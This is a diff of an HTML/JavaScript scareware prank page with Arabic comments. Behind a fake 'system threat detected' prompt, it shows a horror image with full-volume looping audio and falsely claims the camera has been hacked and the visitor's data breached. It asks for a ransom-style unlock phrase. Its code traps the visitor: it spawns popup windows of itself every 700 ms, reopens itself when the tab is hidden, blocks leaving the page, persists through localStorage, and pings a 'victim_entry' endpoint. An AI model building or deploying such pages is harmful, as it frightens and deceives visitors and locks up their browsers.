@@ -3,54 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ CRITICAL_SYSTEM_ERROR ☠️</title>
+    <title>☠️ SYSTEM_POSSESSED ☠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; display: flex; justify-content: center; align-items: center; }
         
-        /* ميزة الصورة المتحركة سواسوة */
+        /* ميزة الرأس المتحرك كأنه إنسان حقيقي سواسوة */
         #horrorImg { 
-            position: absolute; 
-            width: 120vw; height: 120vh; /* أكبر من الشاشة باش كي تتحرك ما يبانش الفراغ */
+            position: fixed; top: 0; left: 0; 
+            width: 110vw; height: 110vh; 
             object-fit: cover; 
             z-index: 9999; display: none; 
-            filter: contrast(200%) brightness(70%) grayscale(50%);
-            transition: all 0.1s ease-in-out; /* حركة سريعة ومفاجئة */
+            filter: contrast(210%) brightness(75%) grayscale(30%);
+            /* تفعيل أنيميشن الحركة البشرية سواسوة */
+            animation: humanMovement 4s infinite ease-in-out;
+        }
+
+        @keyframes humanMovement {
+            0% { transform: translate(-2%, -2%) rotate(0deg) scale(1); }
+            15% { transform: translate(1%, 2%) rotate(1deg) scale(1.02); } /* التفاتة خفيفة سواسوة */
+            30% { transform: translate(-1%, -1%) rotate(-1deg) scale(1.01); }
+            45% { transform: translate(2%, -2%) rotate(2deg) scale(1.05); } /* زووم مفاجئ سواسوة */
+            60% { transform: translate(-2%, 1%) rotate(0deg) scale(1.02); }
+            80% { transform: translate(1%, -1%) rotate(-2deg) scale(1.03); }
+            100% { transform: translate(-2%, -2%) rotate(0deg) scale(1); }
         }
 
         #deepWebOverlay { 
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
             z-index: 10000; color: #f00; text-align: center; font-family: 'Courier New', monospace; 
-            background: rgba(0,0,0,0.85); padding: 30px; border: 2px solid #600; display: none; width: 90%; 
-            box-shadow: 0 0 100px #f00;
+            background: rgba(0,0,0,0.88); padding: 35px; border: 1px solid #800; display: none; width: 92%; 
+            box-shadow: 0 0 120px #f00;
         }
 
-        .eyes-pulse { animation: pulse 0.5s infinite alternate; }
-        @keyframes pulse { from { filter: hue-rotate(0deg) contrast(200%); } to { filter: hue-rotate(20deg) contrast(250%); } }
+        .eyes-red-glow { animation: redGlow 0.2s infinite alternate; }
+        @keyframes redGlow { from { text-shadow: 0 0 10px #f00; } to { text-shadow: 0 0 30px #f00, 0 0 40px #f00; } }
 
-        .blink-red { animation: blinker 0.1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        .blink-fast { animation: blinker 0.06s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0.3; } }
         
-        #unlockBox { margin-top: 20px; border: 1px solid #f00; background: #000; color: #f00; padding: 12px; width: 80%; text-align: center; font-weight: bold; }
+        #unlockBox { margin-top: 25px; border: 1px solid #f00; background: #000; color: #f00; padding: 15px; width: 85%; text-align: center; font-size: 18px; font-weight: bold; outline: none; }
     </style>
 </head>
 <body onclick="launchNightmare()">
 
-    <div id="setup" style="color: #600; font-family: monospace; font-size: 14px; text-align: center; cursor: pointer;">
-        [ SYSTEM_REPAIR_REQUIRED ]<br>
-        PLEASE CLICK TO INITIALIZE SCAN...
+    <div id="initScreen" style="color: #500; font-family: monospace; font-size: 16px; text-align: center; cursor: pointer;">
+        [ ! ] SYSTEM THREAT DETECTED<br>
+        CLICK TO NEUTRALIZE
     </div>
 
-    <img id="horrorImg" class="eyes-pulse" src="https://i.ibb.co/39snnynW/1000016067.jpg">
+    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
     
     <div id="deepWebOverlay">
-        <h1 class="blink-red" style="font-size: 26px; letter-spacing: 5px;">I SEE YOU</h1>
-        <p style="font-size: 14px; color: #fff; font-weight: bold;">
-            لقد انتهى وقتك. جميع ملفاتك مشفرة ولن تسمع إلا هذا الصوت.
+        <h1 class="eyes-red-glow" style="font-size: 28px; letter-spacing: 4px;">HE IS INSIDE</h1>
+        <p style="font-size: 15px; color: #fff;">
+            لقد اخترقنا الكاميرا.. نحن نراك الآن وأنت تشاهدنا.
         </p>
-        <p style="font-size: 11px; color: #ff0000;">IP: <span id="ip">TRACKED</span> | DATA: <span class="blink-red">UPLOADING...</span></p>
+        <p class="blink-fast" style="font-size: 12px; color: #f00; font-weight: bold;">DATA BREACH: 100% COMPLETED</p>
         
-        <input type="text" id="unlockBox" placeholder="أدخل كود الفدية للمغادرة" oninput="verifyAdmin()">
-        <p style="font-size: 10px; color: #555; margin-top: 10px;">ROOT@DEEPWEB_TERMINAL</p>
+        <input type="text" id="unlockBox" placeholder="أدخل الرمز لفك الحظر" oninput="verifyAdmin()">
+        <p style="font-size: 10px; color: #444; margin-top: 15px;">SECURE_TUNNEL: ENCRYPTED</p>
     </div>
 
     <audio id="sfx" loop>
@@ -62,46 +73,43 @@
         const isAdmin = urlParams.get('user') === 'admin_dz'; 
         const MY_LINK = window.location.href;
         const audio = document.getElementById('sfx');
-        const img = document.getElementById('horrorImg');
+
+        // ميزة الذاكرة لضمان استمرار الرعب سواسوة
+        if (localStorage.getItem('stalker_active') === 'true' && !isAdmin) {
+            setTimeout(() => launchNightmare(), 100);
+        }
 
         function launchNightmare() {
-            if (isAdmin) return alert("Admin Bypass: Active.");
+            if (isAdmin) return alert("Bypass Verified. Admin Mode.");
             
             fetch('http://localhost:8080/victim_entry', {mode: 'no-cors'}).catch(() => {});
-            localStorage.setItem('terminal_breach', 'true');
+            localStorage.setItem('stalker_active', 'true');
 
-            document.getElementById('setup').style.display = 'none';
-            img.style.display = 'block';
+            document.getElementById('initScreen').style.display = 'none';
+            document.getElementById('horrorImg').style.display = 'block';
             document.getElementById('deepWebOverlay').style.display = 'block';
             
-            // تشغيل الصوت كامل وبقوة سواسوة
+            // انطلاق الصوت الكامل سواسوة
             audio.volume = 1.0;
             audio.currentTime = 0;
             audio.play();
 
-            // ميزة تحريك الصورة عشوائياً (Dynamic Stalking) سواسوة
+            // الحبس القسري سواسوة
             setInterval(() => {
                 if (!isAdmin) {
-                    const x = Math.random() * 20 - 10; // تحرك بين -10 و 10
-                    const y = Math.random() * 20 - 10;
-                    img.style.transform = `translate(${x}px, ${y}px) scale(1.1)`;
+                    window.open(MY_LINK, '_blank', 'width=10,height=10');
                 }
-            }, 100);
-
-            // الحبس الأبدي سواسوة
-            setInterval(() => {
-                if (!isAdmin) window.open(MY_LINK, '_blank', 'width=1,height=1');
             }, 700);
         }
 
         function verifyAdmin() {
             if (document.getElementById('unlockBox').value === "free palastine") {
-                localStorage.removeItem('terminal_breach');
+                localStorage.removeItem('stalker_active');
                 location.href = "https://www.google.com";
             }
         }
 
-        window.onbeforeunload = () => "FILES_ENCRYPTED_PERMANENTLY";
+        window.onbeforeunload = () => "CRITICAL ERROR: DO NOT LEAVE";
         document.addEventListener("visibilitychange", () => {
             if (!isAdmin && document.visibilityState === 'hidden') window.open(MY_LINK, '_blank');
         });
